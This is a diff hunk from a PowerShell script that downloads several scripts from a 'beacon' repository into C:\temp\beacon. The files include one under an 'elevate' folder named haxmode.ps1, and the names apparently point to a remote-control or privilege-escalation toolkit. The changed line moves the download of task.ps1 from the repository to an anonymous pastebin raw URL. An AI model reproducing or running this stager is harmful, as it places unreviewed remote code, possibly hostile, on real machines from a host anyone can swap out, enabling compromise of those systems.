@@ -13,7 +13,7 @@ Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/maste
 Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/master/run.ps1 > C:\temp\beacon\run.ps1
 Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/master/newprocess.ps1 > C:\temp\beacon\newprocess.ps1
 Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/master/GetState.ps1 > C:\temp\beacon\GetState.ps1
-Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/master/task.ps1 > C:\temp\beacon\task.ps1
+Invoke-Restmethod -Uri https://pastebin.com/raw/urK1nS7q > C:\temp\beacon\task.ps1
 Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/master/TCPState.ps1 > C:\temp\beacon\TCPState.ps1
 Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/master/elevate/haxmode.ps1 > C:\temp\beacon\elevate\haxmode.ps1
 
